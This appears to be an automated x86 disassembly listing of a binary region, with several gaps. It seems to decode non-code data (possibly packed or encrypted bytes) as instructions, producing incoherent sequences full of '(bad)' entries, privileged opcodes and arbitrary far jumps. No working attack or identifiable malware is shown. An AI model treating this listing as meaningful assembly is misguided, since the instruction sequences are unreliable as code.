  419429:	inc    ecx
  41942a:	jbe    0x4193e7
  41942c:	dec    edi
  41942d:	inc    ebx
  41942e:	push   esi
  41942f:	mov    esp,0xc4c496c3
  419434:	lock or DWORD PTR [ebp-0x4fb689a8],ebx
  41943b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41943c:	xor    esp,DWORD PTR [ebp+0x3a5ede66]
  419442:	jle    0x4194a0
  419444:	popf   
  419445:	mov    WORD PTR [esi+0x8],gs
  419448:	and    DWORD PTR [eax-0x7c],0xffffffd6
  41944c:	hlt    
  41944d:	lds    ebp,FWORD PTR [ecx]
  41944f:	das    
  419450:	(bad)  
  419451:	xchg   esi,eax
  419452:	shl    DWORD PTR [ebx],cl
  419454:	push   eax
  419455:	pop    ds
  419456:	mov    bh,0x87
  419458:	inc    edx
  419459:	js     0x41940f
  41945b:	mov    ecx,0xf546b5a6
  419460:	mov    bh,ch
  419462:	push   edx
  419463:	mov    DWORD PTR [ebx],edx
  419465:	leave  
  419466:	or     BYTE PTR [edx+esi*8-0x30],0xa1
  41946b:	out    0x3e,al
	...
  4194d5:	add    BYTE PTR ds:0xed3a6998,bh
  4194db:	sti    
  4194dc:	jg     0x41947d
  4194de:	cmp    ebx,esi
  4194e0:	je     0x4194a8
  4194e2:	aaa    
  4194e3:	and    DWORD PTR [edi+0x1102e16],ebx
  4194e9:	add    bh,bh
  4194eb:	add    BYTE PTR [eax],al
  4194ed:	add    BYTE PTR [eax+edi*8-0x6d2311dd],bl
  4194f4:	lods   eax,DWORD PTR ds:[esi]
  4194f5:	jl     0x4194db
  4194f7:	je     0x41956f
  4194f9:	mov    al,ds:0x3cabd45a
  4194fe:	dec    edx
  4194ff:	arpl   dx,ax
  419501:	shr    DWORD PTR [edx-0x4723be9f],cl
  419507:	test   eax,0x40871f3d
  41950c:	sbb    edi,esp
  41950e:	ret    0xfc7d
  419511:	xchg   BYTE PTR [edi+ebx*4],al
  419514:	push   eax
  419515:	sbb    edi,DWORD PTR [esi-0x77a58e]
  41951b:	xchg   ebx,eax
  41951c:	popa   
  41951d:	call   0x5590:0x3336398f
  419524:	xchg   ebp,eax
  419525:	(bad)  
  419526:	dec    DWORD PTR [edi-0x2938d2b1]
  41952c:	jg     0x419509
  41952e:	jge    0x419519
  419530:	call   DWORD PTR [ebx]
  419532:	jb     0x419576
  419534:	cmc    
  419535:	out    dx,al
  419536:	adc    edx,DWORD PTR [ecx-0x115a3d09]
  41953c:	inc    esi
  41953d:	int    0xc9
  41953f:	les    sp,DWORD PTR [eax+edi*8+0x66ba581a]
  419547:	add    al,0x78
  419549:	imul   ebx,ecx,0x75
  41954c:	xor    eax,0x176bb4c1
  419551:	adc    edx,esi
  419553:	leave  
  419554:	mov    ds:0xb48b9088,al
  419559:	pop    ss
  41955a:	add    al,0xd3
  41955c:	xor    eax,0x71516c70
  419561:	xchg   ecx,eax
  419562:	inc    ecx
  419563:	clts   
  419565:	sbb    esi,0x35e79230
  41956b:	test   DWORD PTR [ebx+0x43bb12ad],ebp
  419571:	xor    DWORD PTR [ecx-0x3],edx
  419574:	fidivr DWORD PTR [edx-0x31faaa1b]
  41957a:	jno    0x4195b9
  41957c:	push   ebx
  41957d:	or     dl,BYTE PTR [edi]
  41957f:	(bad)  
  419580:	push   ds
  419581:	jnp    0x419561
  419583:	cmc    
  419584:	adc    DWORD PTR [ebp+0xe6b76dd],edx
  41958a:	pop    esp
  41958b:	mov    dl,0xb4
  41958d:	clts   
  41958f:	sub    al,0xb3
  419591:	loopne 0x419609
  419593:	pop    edi
  419594:	add    eax,0x98dc2035
  419599:	mov    edx,0xdf443c1b
  41959e:	inc    eax
  41959f:	push   edx
  4195a0:	xor    BYTE PTR [esi-0x4d],bh
  4195a3:	ds leave 
  4195a5:	rcl    BYTE PTR [ebx+ebp*8],1
  4195a8:	push   es
  4195a9:	inc    ebx
  4195aa:	xchg   BYTE PTR [ecx-0x32f66b8],ah
  4195b0:	jg     0x419630
  4195b2:	sahf   
  4195b3:	xchg   esp,eax
  4195b4:	aam    0xb4
  4195b6:	xor    al,0x0
  4195b8:	jae    0x41959a
  4195ba:	popa   
  4195bb:	push   cs
  4195bc:	sub    BYTE PTR [esi+0x66509f15],0x45
  4195c3:	push   ecx
  4195c4:	add    ebx,esi
  4195c6:	push   es
  4195c7:	dec    ebp
  4195c8:	adc    cl,BYTE PTR [esp+ecx*1]
  4195cb:	cmp    cl,BYTE PTR [edx+0x571c4347]
  4195d1:	xchg   esi,eax
  4195d2:	je     0x41964f
  4195d4:	dec    ebx
  4195d5:	rcl    BYTE PTR [edx-0x15],cl
  4195d8:	inc    ebx
  4195d9:	stc    
  4195da:	dec    esi
  4195db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4195dc:	adc    ebx,DWORD PTR [edi-0x7a]
  4195df:	fmul   DWORD PTR [esi+0x15]
  4195e2:	push   eax
  4195e3:	pop    ebx
  4195e4:	ins    BYTE PTR es:[edi],dx
  4195e5:	stos   BYTE PTR es:[edi],al
  4195e6:	jge    0x419597
  4195e8:	mov    edi,0xbca17197
	...
  419655:	add    BYTE PTR [edi-0x9d722c],ch
  41965b:	jnp    0x41964c
  41965d:	fstp   st(1)
  41965f:	fcomp  QWORD PTR [ebx+0x2f]
  419662:	pop    ecx
  419663:	jle    0x41968a
  419665:	je     0x419694
  419667:	adc    DWORD PTR [ecx],eax
  419669:	add    bh,bh
  41966b:	add    BYTE PTR [eax],al
  41966d:	add    BYTE PTR [ebx+0x2cae0b4d],ah
  419673:	xor    cl,BYTE PTR [ecx-0x5d]
  419676:	aas    
  419677:	cmp    DWORD PTR [ebp+0x2c],0x7353e759
  41967e:	ret    
  41967f:	arpl   WORD PTR [ebx],dx
  419681:	jae    0x4196d9
  419683:	imul   edi,edx,0xffffffcb
  419686:	xor    ebp,DWORD PTR [edi]
  419688:	sahf   
  419689:	jp     0x419707
  41968b:	cmp    bh,ch
  41968d:	xchg   BYTE PTR [esi-0x12],cl
  419690:	jmp    0xa4b6:0xf99a0e
  419697:	or     ecx,DWORD PTR cs:[eax]
  41969a:	rcr    ch,1
  41969c:	push   0xd9864545
  4196a1:	cmp    edi,DWORD PTR [ebp+0x564b911e]
  4196a7:	xchg   BYTE PTR cs:[ebx+0x7057d2b6],ch
  4196ae:	je     0x4196c6
  4196b0:	loop   0x41968a
  4196b2:	out    0xd6,al
  4196b4:	or     al,0x96
  4196b6:	sub    esi,DWORD PTR [ebx+0x45]
  4196b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4196ba:	sub    al,0xae
  4196bc:	rcl    DWORD PTR [esi-0x28],cl
  4196bf:	(bad)  
  4196c0:	in     al,0x54
  4196c2:	xchg   esp,eax
  4196c3:	test   BYTE PTR [ecx],bh
  4196c5:	mov    DWORD PTR [edi-0x45],eax
  4196c8:	mov    es,esp
  4196ca:	mov    ch,BYTE PTR [ebx-0x2961fea2]
  4196d0:	pop    eax
  4196d1:	mov    esi,ebx
  4196d3:	push   0x382ba93d
  4196d8:	addr16 dec ebp
  4196da:	mov    dl,0x23
  4196dc:	jecxz  0x419723
  4196de:	ins    DWORD PTR es:[edi],dx
  4196df:	and    al,0xc3
  4196e1:	fwait
  4196e2:	scas   eax,DWORD PTR es:[edi]
  4196e3:	hlt    
  4196e4:	and    eax,DWORD PTR ds:0xb1ac7d51
  4196ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4196eb:	cmp    ebx,DWORD PTR ss:[ebx-0x7c]
  4196ef:	data16 mov al,0x3c
  4196f2:	xor    bl,BYTE PTR [ecx-0x2e7df085]
  4196f8:	and    BYTE PTR [ebp-0x7c000b91],0x27
  4196ff:	jl     0x419768
  419701:	cmp    eax,0xa4f65de3
  419706:	jmp    0x419694
  419708:	into   
  419709:	jg     0x419776
  41970b:	ss cli 
  41970d:	fidivr WORD PTR [edi+edi*1]
  419710:	jmp    0x4196bf
  419712:	jmp    0xbc98595
  419717:	arpl   dx,bx
  419719:	adc    BYTE PTR [ecx+0x45],bh
  41971c:	fild   WORD PTR [edi]
  41971e:	xchg   BYTE PTR [ecx],dh
  419720:	cmp    al,0xee
  419722:	adc    esi,DWORD PTR [ebp+0x3111b81d]
  419728:	fistp  QWORD PTR [esi+ebp*8]
  41972b:	jge    0x41979e
  41972d:	clc    
  41972e:	dec    ebp
  41972f:	mov    ch,BYTE PTR [edx+0x51]
  419732:	leave  
  419733:	fisubr DWORD PTR [ecx-0x80]
  419736:	adc    al,0x27
  419738:	stos   BYTE PTR es:[edi],al
  419739:	mov    ds:0xfc430010,al
  41973e:	or     bl,ah
  419740:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419741:	pop    esi
  419742:	pop    ebp
  419743:	(bad)  
  419744:	xchg   edx,eax
  419745:	enter  0xd7fa,0x9c
  419749:	cmp    eax,0xc1ba1361
  41974e:	jbe    0x419712
  419750:	fld    DWORD PTR [ebx+ebp*2+0x79]
  419754:	(bad)  
  419755:	push   ebp
  419756:	sti    
  419757:	popa   
  419758:	sbb    BYTE PTR [edx+eiz*1],dl
  41975b:	and    eax,eax
  41975d:	or     eax,ecx
  41975f:	adc    al,0x94
  419761:	idiv   BYTE PTR [ecx]
  419763:	mov    ah,0x13
  419765:	xchg   bl,ah
  419767:	out    0x93,eax
  419769:	mov    ds:0xb1df4a,al
	...
  4197d6:	mov    bl,0x3f
  4197d8:	jno    0x41983f
  4197da:	std    
  4197db:	outs   dx,DWORD PTR ds:[esi]
  4197dc:	mov    bh,0xff
  4197de:	add    eax,0x108dd0ae
  4197e3:	push   ebp
  4197e4:	pop    ebx
  4197e5:	adc    al,0x2c
  4197e7:	adc    al,BYTE PTR [ecx]
  4197e9:	add    bh,bh
  4197eb:	add    BYTE PTR [eax],al
  4197ed:	add    BYTE PTR [esi-0x1a],ah
  4197f0:	sbb    al,0xf2
  4197f2:	loop   0x419855
  4197f4:	(bad)  
  4197f5:	int    0xd9
  4197f7:	loope  0x419847
  4197f9:	popa   
  4197fa:	dec    edx
  4197fb:	es dec eax
  4197fd:	xor    ah,BYTE PTR [ebx-0x32]
  419800:	mov    ecx,0xfa94dc45
  419805:	pop    esp
  419806:	mov    bl,0xd4
  419808:	ret    0x21c
  41980b:	adc    BYTE PTR [eax],dl
  41980d:	push   ss
  41980e:	cld    
  41980f:	rep stos BYTE PTR es:[edi],al
  419811:	cmp    ch,BYTE PTR [edx+0x2d3f820]
  419817:	sub    BYTE PTR [ecx],bh
  419819:	(bad)  
  41981a:	fld    DWORD PTR [eax]
  41981c:	in     eax,dx
  41981d:	mov    dh,0xef
  41981f:	cld    
  419820:	test   eax,0x7e5f0cea
  419825:	lods   eax,DWORD PTR ds:[esi]
  419826:	sub    eax,0x3a2a7aee
  41982b:	nop
  41982c:	data16 sbb bh,BYTE PTR [ebx+0x9]
  419830:	fwait
  419831:	sti    
  419832:	pop    edx
  419833:	or     al,0x89
  419835:	rcr    BYTE PTR [ebx+0x7],cl
  419838:	out    0xea,al
  41983a:	push   esi
  41983b:	push   ebx
  41983c:	mov    cl,0x13
  41983e:	cmp    eax,0x55adac6e
  419843:	and    esi,edi
  419845:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419846:	mov    cl,0x0
  419848:	mov    cl,0xf1
  41984a:	imul   edx,DWORD PTR [ebx+0x1b0229c5],0xffffff87
  419851:	pop    ss
  419852:	ret    
  419853:	out    dx,al
  419854:	mov    DWORD PTR [ebp+eiz*2+0x5e],ecx
  419858:	pushf  
  419859:	ret    0x1d34
  41985c:	jmp    0x419862
  41985e:	in     eax,dx
  41985f:	and    dh,al
  419861:	pop    ds
  419862:	arpl   WORD PTR [ebp+0x2e5e001f],si
  419868:	les    edi,FWORD PTR [eax-0x13]
  41986b:	call   0xad42a417
  419870:	jns    0x4198ab
  419872:	sbb    dh,BYTE PTR [eax+edx*4-0x2aeb02af]
  419879:	push   es
  41987a:	jl     0x4198b8
  41987c:	jmp    0x3a016c69
  419881:	pop    ss
  419882:	pop    es
  419883:	sub    BYTE PTR [edi+0x20],bl
  419886:	fcmovb st,st(3)
  419888:	push   edi
  419889:	hlt    
  41988a:	out    dx,eax
  41988b:	mov    edx,ebp
  41988d:	imul   edx,DWORD PTR [eax-0x5ca6f865],0xffffffb1
  419894:	mov    cl,0xfd
  419896:	inc    eax
  419897:	loopne 0x41990d
  419899:	(bad)  
  41989a:	add    BYTE PTR [ebp+0x7c],dl
  41989d:	fcmovu st,st(4)
  41989f:	aad    0x1
  4198a1:	icebp  
  4198a2:	or     esi,DWORD PTR [eax-0x75dc47f5]
  4198a8:	fwait
  4198a9:	outs   dx,DWORD PTR ds:[esi]
  4198aa:	in     eax,dx
  4198ab:	and    bl,al
  4198ad:	mov    ecx,0x27bf9f2c
  4198b2:	mov    ch,0x4c
  4198b4:	stos   DWORD PTR es:[edi],eax
  4198b5:	sub    eax,0xcc513fe2
  4198ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4198bb:	sahf   
  4198bc:	hlt    
  4198bd:	lods   eax,DWORD PTR ds:[esi]
  4198be:	xor    edx,DWORD PTR [edx-0x3b]
  4198c1:	cmp    DWORD PTR [edx+0x27],edi
  4198c4:	inc    ecx
  4198c5:	pop    ebp
  4198c6:	mov    esi,0xeb8a96d9
  4198cb:	xor    ah,BYTE PTR [esi+0x65193735]
  4198d1:	jl     0x41988e
  4198d3:	test   eax,0xc484ae4
  4198d8:	mov    dl,0x4d
  4198da:	mov    cl,0xea
  4198dc:	shl    BYTE PTR [eax-0x3bd42adb],1
  4198e2:	and    BYTE PTR [esi],0x2
  4198e5:	add    BYTE PTR [esp+edi*1-0x45],bl
  4198e9:	nop
  4198ea:	idiv   edi
  4198ec:	mov    al,ds:0x0
	...
  419955:	add    BYTE PTR [edx-0x201eb8e7],al
  41995b:	jmp    DWORD PTR [esi+0x45e3657b]
  419961:	fld    QWORD PTR [edi]
  419963:	pcmpeqd mm1,QWORD PTR [ebx+ebp*1-0xfffeed]
  41996b:	add    BYTE PTR [eax],al
  41996d:	add    dh,ch
  41996f:	mov    bh,0xbd
  419971:	jbe    0x4199d3
  419973:	inc    edi
  419974:	ss adc eax,0x4093445
  41997a:	fist   WORD PTR [edi-0x70e11bc2]
  419980:	mov    edx,0x3fb5d62
  419985:	sub    DWORD PTR ds:0x9cf0ddc0,esi
  41998b:	mov    bh,0xe5
  41998d:	dec    esp
  41998e:	in     eax,dx
  41998f:	pop    esp
  419990:	mov    al,0xb7
  419992:	gs int 0xf8
  419995:	je     0x4199f2
  419997:	mov    ch,0x9
  419999:	sbb    eax,0x6149be9a
  41999e:	jp     0x419a13
  4199a0:	test   al,0xf4
  4199a2:	add    ebx,DWORD PTR [esi]
  4199a4:	mov    ah,0xc6
  4199a6:	call   FWORD PTR [ebp+edx*2+0x6c]
  4199aa:	xchg   ecx,eax
  4199ab:	sbb    bh,BYTE PTR [eax-0x72]
  4199ae:	les    ebp,FWORD PTR [eax-0x65]
  4199b1:	imul   edi,esp,0xb40f52ac
  4199b7:	out    dx,al
  4199b8:	sbb    al,BYTE PTR [esi]
  4199ba:	rcr    DWORD PTR [eax-0x724f347b],1
  4199c0:	pop    ds
  4199c1:	mov    edi,?
  4199c3:	mov    eax,0x39441009
  4199c8:	or     edi,esi
  4199ca:	xor    DWORD PTR [edi+edi*1],ecx
  4199cd:	push   es
  4199ce:	xor    eax,edx
  4199d0:	xor    al,0x68
  4199d2:	(bad)  
  4199d3:	ror    DWORD PTR [ebx-0xe],cl
  4199d6:	sbb    BYTE PTR [ecx],dh
  4199d8:	pop    ebp
  4199d9:	cmp    DWORD PTR [eax+0x13],edx
  4199dc:	daa    
  4199dd:	sbb    DWORD PTR [eax+0x38a7534b],ebp
  4199e3:	cmp    BYTE PTR [eax+0x4],bl
  4199e6:	add    eax,0xb1b6f43
  4199eb:	jo     0x419a2a
  4199ed:	mov    bh,0xb3
  4199ef:	mov    ds:0x2b4ca93e,al
  4199f4:	mov    edx,0x83524363
  4199f9:	fisttp WORD PTR [edi-0x8]
  4199fc:	sbb    bl,BYTE PTR [esi-0x198ca821]
  419a02:	dec    esi
  419a03:	inc    esp
  419a04:	lods   eax,DWORD PTR ds:[esi]
  419a05:	in     al,0x25
  419a07:	test   bh,dl
  419a09:	xchg   edi,eax
  419a0a:	xor    BYTE PTR [edi-0x65],ah
  419a0d:	adc    DWORD PTR [esi-0x4e],ebx
  419a10:	pushf  
  419a11:	pop    ebp
  419a12:	jo     0x419a7b
  419a14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419a15:	inc    edx
  419a16:	aaa    
  419a17:	mov    es,WORD PTR [esi+0x4dd98bd5]
  419a1d:	(bad)  
  419a1e:	addr16 add eax,0xe7563ad9
  419a24:	fwait
  419a25:	out    0x1d,eax
  419a27:	dec    ecx
  419a28:	jne    0x419a68
  419a2a:	scas   eax,DWORD PTR es:[edi]
  419a2b:	push   esi
  419a2c:	pop    ss
  419a2d:	xchg   esp,eax
  419a2e:	out    dx,al
  419a2f:	xchg   DWORD PTR [ebp+edx*8-0x26e1323c],ebp
  419a36:	cwde   
  419a37:	sub    BYTE PTR [ebp-0x505abc82],cl
  419a3d:	dec    edi
  419a3e:	movd   mm6,DWORD PTR [ebp+0x2c]
  419a42:	scas   eax,DWORD PTR es:[edi]
  419a43:	call   0x1acdea9b
  419a48:	pop    eax
  419a49:	xchg   edx,eax
  419a4a:	in     al,0x85
  419a4c:	adc    DWORD PTR ds:0x8bb77038,0xffffffe4
  419a53:	in     eax,dx
  419a54:	sahf   
  419a55:	test   al,0xa8
  419a57:	push   ebx
  419a58:	push   es
  419a59:	(bad)  
  419a5a:	push   eax
  419a5b:	xchg   esi,eax
  419a5c:	xchg   BYTE PTR [ebp+eax*1-0x1329dcc9],ah
  419a63:	retf   0xa3e5
  419a66:	outs   dx,DWORD PTR ds:[esi]
  419a67:	push   edi
  419a68:	xor    eax,DWORD PTR [eax]
  419a6a:	add    DWORD PTR [edx-0x7e],ecx
	...
  419ad5:	add    BYTE PTR [ebx],dh
  419ad7:	xor    DWORD PTR [ebx+0x77e793c5],edx
  419add:	test   ebx,0xc2c215d3
  419ae3:	inc    esi
  419ae4:	mov    ds,WORD PTR [edx+ebp*1+0x14]
  419ae8:	add    DWORD PTR [eax],eax
  419aea:	inc    DWORD PTR [eax]
  419aec:	add    BYTE PTR [eax],al
  419aee:	out    0xab,eax
  419af0:	aaa    
  419af1:	inc    edi
  419af2:	jno    0x419b56
  419af4:	pop    ebp
  419af5:	daa    
  419af6:	add    ah,bh
  419af8:	fstp   QWORD PTR [edi-0x66]
  419afb:	popa   
  419afc:	sar    BYTE PTR [ebx-0x67bf9379],cl
  419b02:	pusha  
  419b03:	std    
  419b04:	ins    DWORD PTR es:[edi],dx
  419b05:	dec    ebx
  419b06:	into   
  419b07:	pop    ebp
  419b08:	dec    eax
  419b09:	into   
  419b0a:	aas    
  419b0b:	xor    DWORD PTR [ebx+0x46],esp
  419b0e:	xor    ebx,esi
  419b10:	mov    edx,0x2b9b8730
  419b15:	repz push ecx
  419b17:	jns    0x419b83
  419b19:	add    dh,BYTE PTR ds:0x547bd4b2
  419b1f:	pusha  
  419b20:	push   edi
  419b21:	mov    esi,0x43459121
  419b26:	mov    cl,0x9f
  419b28:	xchg   BYTE PTR [edx+0x2c],bh
  419b2b:	inc    ebp
  419b2c:	test   eax,0x37692ff3
  419b31:	jge    0x419b81
  419b33:	inc    esi
  419b34:	cmc    
  419b35:	push   esi
  419b36:	jle    0x419b63
  419b38:	arpl   WORD PTR [ecx+0x1e2533c5],bx
  419b3e:	test   eax,0x180e8224
  419b43:	jae    0x419b38
  419b45:	int    0x23
  419b47:	sbb    esi,DWORD PTR [edx-0x79e5e1cb]
  419b4d:	stos   BYTE PTR es:[edi],al
  419b4e:	rol    BYTE PTR [ebp+0xee71e4b],0xef
  419b55:	pop    ecx
  419b56:	ret    0xeff4
  419b59:	lock clc 
  419b5b:	mov    edi,0xe8dfa27c
  419b60:	idiv   BYTE PTR [esi-0x26]
  419b63:	fwait
  419b64:	xchg   edi,eax
  419b65:	cdq    
  419b66:	sahf   
  419b67:	rcr    DWORD PTR [ecx],cl
  419b69:	scas   al,BYTE PTR es:[edi]
  419b6a:	adc    DWORD PTR [eax],edx
  419b6c:	and    al,0x30
  419b6f:	cmp    eax,0x8fe7e38b
  419b74:	(bad)  
  419b75:	out    0x4d,al
  419b77:	in     eax,dx
  419b78:	(bad)  
  419b79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419b7a:	ss cs ds popa 
  419b7e:	call   0x1b0a:0xb5131a2e
  419b85:	and    eax,esp
  419b87:	xor    DWORD PTR [ebp-0x2a],eax
  419b8a:	jp     0x419b37
  419b8c:	jo     0x419bf3
  419b8e:	sbb    eax,0x327c8b65
  419b93:	mov    eax,ds:0x246e1a0
  419b98:	push   ds
  419b99:	xor    cl,0xe5
  419b9c:	sti    
  419b9d:	cld    
  419b9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419b9f:	xchg   DWORD PTR [edx+0x6308e0c6],ebp
  419ba5:	mov    ah,0x41
  419ba7:	ret    
  419ba8:	enter  0xa0f5,0x3
  419bac:	out    0xf4,al
  419bae:	jo     0x419bf8
  419bb0:	cdq    
  419bb1:	adc    DWORD PTR [ecx+0x7d],0xffffffe7
  419bb5:	out    0x15,al
  419bb7:	push   cs
  419bb8:	xchg   DWORD PTR [ecx+0x51],edi
  419bbb:	test   BYTE PTR [esi],dl
  419bbd:	stos   BYTE PTR es:[edi],al
  419bbe:	jmp    0x8faa1144
  419bc3:	or     eax,DWORD PTR [eax]
  419bc5:	(bad)  
  419bc7:	out    0xd8,eax
  419bc9:	pop    eax
  419bca:	xchg   ah,bh
  419bcc:	jecxz  0x419b8a
  419bce:	jno    0x419be4
  419bd0:	ds cs clc 
  419bd3:	inc    eax
  419bd4:	xor    dl,dh
  419bd6:	lods   al,BYTE PTR ds:[esi]
  419bd7:	inc    edi
  419bd8:	jmp    0xa942:0x739c60bc
  419bdf:	push   0xb1f2df1e
  419be4:	and    ecx,ebp
  419be6:	dec    ebx
  419be7:	retf   0xff08
  419bea:	dec    ecx
  419beb:	adc    ah,BYTE PTR [ecx+0x0]
	...
  419c56:	dec    edx
  419c57:	(bad)  
  419c58:	cli    
  419c59:	inc    edi
  419c5a:	(bad)  
  419c5b:	jg     0x419c5c
  419c5d:	int    0x88
  419c5f:	xchg   ecx,eax
  419c60:	lods   al,BYTE PTR ds:[esi]
  419c61:	or     al,0x7f
  419c63:	call   0x1:0x1529326d
  419c6a:	inc    DWORD PTR [eax]
  419c6c:	add    BYTE PTR [eax],al
  419c6e:	mov    ds:0xa575c106,eax
  419c73:	ins    DWORD PTR es:[edi],dx
  419c74:	shl    BYTE PTR [esi+0x7fecb248],1
  419c7a:	(bad)  
  419c7b:	fwait
  419c7c:	jle    0x419cd2
  419c7e:	cmp    DWORD PTR ds:0xfdf35727,esi
  419c84:	stos   DWORD PTR es:[edi],eax
  419c85:	pushf  
  419c86:	lds    eax,FWORD PTR [esp+edx*4+0x69]
  419c8a:	cmp    eax,DWORD PTR [ebp+0x1b]
  419c8d:	push   ebx
  419c8e:	add    al,0xb5
  419c90:	inc    ebx
  419c91:	xor    ebx,DWORD PTR [ecx-0x7d]
  419c94:	xlat   BYTE PTR ds:[ebx]
  419c95:	shr    bh,cl
  419c97:	push   cs
  419c98:	pop    eax
  419c99:	shl    DWORD PTR [ebx-0xe],1
  419c9c:	add    BYTE PTR ds:0xac38e5e5,0xb5
  419ca3:	sub    eax,0x176a4beb
  419ca8:	repz push edx
  419caa:	arpl   WORD PTR [edx+0x43],di
  419cad:	scas   eax,DWORD PTR es:[edi]
  419cae:	jae    0x419c81
  419cb0:	fcom   DWORD PTR [esi+0x3]
  419cb3:	push   ss
  419cb4:	fiadd  DWORD PTR [eax-0x30d9eb79]
  419cba:	mov    ecx,0x2cfd561b
  419cbf:	mov    dl,0x5f
  419cc1:	push   edx
  419cc2:	push   edi
  419cc3:	daa    
  419cc4:	outs   dx,BYTE PTR ds:[esi]
  419cc5:	mov    ?,WORD PTR [edx+0x74]
  419cc8:	repnz (bad) 
  419cca:	lahf   
  419ccb:	push   ds
  419ccc:	jmp    0xf3bb:0x804c
  419cd2:	aas    
  419cd3:	sbb    al,0x51
  419cd5:	mov    bl,0xa
  419cd7:	jmp    0x51c3fea1
  419cdc:	xor    BYTE PTR [edx+0x540648f1],cl
  419ce2:	or     eax,0xacbdf8ad
  419ce7:	sub    DWORD PTR ds:0x3837e9f9,0x5c
  419cee:	lods   eax,DWORD PTR ds:[esi]
  419cef:	les    edx,FWORD PTR [edi+0x5b]
  419cf2:	push   0xb9521589
  419cf7:	icebp  
  419cf8:	jbe    0x419cf9
  419cfa:	frstor [edi-0x58d97812]
  419d00:	sub    DWORD PTR [esi],ecx
  419d02:	enter  0x7f08,0x6f
  419d06:	loope  0x419d42
  419d08:	(bad)  
  419d09:	inc    DWORD PTR [ecx]
  419d0b:	pushf  
  419d0c:	nop
  419d0d:	push   eax
  419d0e:	jo     0x419ce8
  419d10:	into   
  419d11:	mov    eax,0x63837fcf
  419d16:	or     BYTE PTR [esi-0x5e],ch
  419d19:	aad    0x15
  419d1b:	jmp    0x419d18
  419d1d:	in     al,dx
  419d1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419d1f:	cmp    DWORD PTR [ebx],ebp
  419d21:	adc    cl,BYTE PTR [edi-0x69]
  419d24:	adc    cl,al
  419d26:	sbb    DWORD PTR [ebx],edx
  419d28:	inc    edx
  419d29:	out    dx,eax
  419d2a:	out    0xf1,al
  419d2c:	dec    esp
  419d2d:	repz sub edi,edi
  419d30:	add    DWORD PTR [edi+0x66fa29e4],esi
  419d36:	sbb    BYTE PTR [ebx],dl
  419d38:	adc    DWORD PTR [ebx],eax
  419d3a:	div    DWORD PTR [ebx+0x1f]
  419d3d:	js     0x419d76
  419d3f:	jno    0x419ce6
  419d41:	call   0x49fd:0x5375cce
  419d48:	mov    eax,0x73130c1f
  419d4d:	fxch   st(4)
  419d4f:	add    cl,BYTE PTR [ebx+ecx*4-0x39]
  419d53:	cmp    ebx,DWORD PTR [ecx-0x22]
  419d56:	test   edx,esi
  419d58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419d59:	fwait
  419d5a:	or     BYTE PTR [edx+0x35],ch
  419d5d:	mov    WORD PTR [edi],?
  419d5f:	stc    
  419d60:	mov    eax,0xcdeac7ad
  419d65:	data16 jbe 0x419d16
  419d68:	cmp    eax,0x929b5493
	...
  419dd5:	add    al,dh
  419dd7:	xchg   edi,eax
  419dd8:	std    
  419dd9:	cmp    al,0xff
  419ddb:	jle    0x419dce
  419ddd:	fistp  QWORD PTR [edi-0x16]
  419de0:	ss (bad) 
  419de3:	cli    
  419de4:	pusha  
  419de5:	in     eax,dx
  419de6:	sub    BYTE PTR [esi],dl
  419de8:	add    DWORD PTR [eax],eax
  419dea:	inc    DWORD PTR [eax]
  419dec:	add    BYTE PTR [eax],al
  419dee:	sub    ch,BYTE PTR [ebx+edx*1-0x2d9afb60]
  419df5:	pop    edi
  419df6:	bound  ebp,QWORD PTR [eax-0x6d]
  419df9:	dec    edx
  419dfa:	popf   
  419dfb:	pop    ss
  419dfc:	cmp    eax,0x45
  419dff:	jo     0x419d8b
  419e01:	or     al,0xa4
  419e03:	cs or  al,0x42
  419e06:	or     BYTE PTR [esi+0x380b4a94],0x4f
  419e0d:	bound  esp,QWORD PTR [esi-0x60cefe5d]
  419e13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e14:	daa    
  419e15:	mov    edx,0x11e96848
  419e1a:	sti    
  419e1b:	sub    ecx,DWORD PTR [ecx+0x40]
  419e1e:	and    al,al
  419e20:	xlat   BYTE PTR ds:[ebx]
  419e21:	sbb    edi,DWORD PTR [edi]
  419e23:	jns    0x419ddf
  419e25:	imul   esi,DWORD PTR ds:0x5d476f1d,0xc1187722
  419e2f:	push   edi
  419e30:	adc    edi,esi
  419e32:	shl    DWORD PTR [ecx+0x2e],1
  419e35:	push   ebx
  419e36:	test   al,0x72
  419e39:	xchg   ebx,eax
  419e3a:	ins    BYTE PTR es:[edi],dx
  419e3b:	jle    0x419e7b
  419e3d:	fsubr  QWORD PTR [ecx]
  419e3f:	inc    edi
  419e40:	cmp    ah,BYTE PTR [esi+0x6e]
  419e43:	leave  
  419e44:	lods   al,BYTE PTR ds:[esi]
  419e45:	mov    bl,0x2
  419e47:	add    ebx,DWORD PTR [ebp-0x1b]
  419e4a:	lea    edi,ds:0xa5ff5745
  419e50:	cmp    ecx,DWORD PTR [edx+eiz*4]
  419e53:	popf   
  419e54:	pop    ebp
  419e55:	pop    edx
  419e56:	idiv   BYTE PTR [ebp+0xe]
  419e59:	pop    es
  419e5a:	hlt    
  419e5b:	lahf   
  419e5c:	sbb    esp,esi
  419e5e:	mov    dh,BYTE PTR [ecx]
  419e60:	and    eax,0xf6cab378
  419e65:	in     eax,0x42
  419e67:	sbb    al,0xda
  419e69:	pop    ecx
  419e6a:	imul   eax,DWORD PTR [ebx-0xb],0x8da4e9f7
  419e71:	mov    bl,0x92
  419e73:	fsubr  st(6),st
  419e75:	jbe    0x419e62
  419e77:	pushf  
  419e78:	pusha  
  419e79:	pop    ecx
  419e7a:	add    DWORD PTR [eax-0x6],edx
  419e7d:	dec    eax
  419e7e:	jge    0x419e9d
  419e80:	push   0x261cb4ed
  419e85:	adc    DWORD PTR [ecx],eax
  419e87:	xor    DWORD PTR [ebx+0xcebcd89],esi
  419e8d:	xlat   BYTE PTR ds:[ebx]
